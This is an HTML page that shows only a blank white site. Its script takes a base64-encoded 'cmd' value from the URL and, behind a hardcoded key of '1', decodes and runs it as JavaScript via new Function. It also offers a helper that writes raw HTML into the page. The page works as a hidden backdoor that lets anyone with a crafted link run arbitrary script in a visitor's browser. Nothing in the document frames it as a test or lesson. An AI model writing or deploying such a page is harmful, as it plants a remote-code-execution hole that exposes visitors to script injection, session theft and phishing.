<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>White Site</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: white; min-height: 100vh; padding: 40px 20px; }
        .container { max-width: 900px; margin: 0 auto; background: white; padding: 40px; }
        #output { color: #000; font-family: monospace; font-size: 14px; line-height: 1.6; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container"><div id="output"></div></div>
    <script>
        const SECRET_KEY = "1";
        
        function showResult(text, isError) {
            const line = document.createElement('div');
            line.textContent = text;
            line.style.color = isError ? '#ff0000' : '#000000';
            document.getElementById('output').appendChild(line);
        }
        
        function clearResult() { 
            document.getElementById('output').innerHTML = ''; 
        }
        
        function resetSite() {
            document.getElementById('output').innerHTML = '';
            showResult('Site reset to default', false);
        }
        
        function executeCode(code) {
            try {
                const wrappedCode = '(function(){ const api={log:function(msg){const d=document.createElement("div");d.textContent=msg;document.getElementById("output").appendChild(d);},clear:function(){document.getElementById("output").innerHTML="";},html:function(h){document.getElementById("output").innerHTML=h;},reset:function(){resetSite();}};' + code + ';})();';
                const func = new Function(wrappedCode);
                func();
                return true;
            } catch(e) { 
                showResult('Error: ' + e.message, true); 
                return false; 
            }
        }
        
        function getParams() {
            const params = new URLSearchParams(window.location.search);
            return { key: params.get('key'), cmd: params.get('cmd'), action: params.get('action') };
        }
        
        function decodeBase64(str) {
            try { return atob(str); } catch(e) { return null; }
        }
        
        function init() {
            const params = getParams();
            if (!params.key && !params.cmd && !params.action) return;
            if (params.key !== SECRET_KEY) { showResult('Wrong key', true); return; }
            if (params.action === 'reset') { resetSite(); return; }
            if (params.cmd) {
                const decoded = decodeBase64(params.cmd);
                if (decoded) executeCode(decoded);
                else showResult('Decode error', true);
            }
        }
        init();
    </script>
</body>
</html>
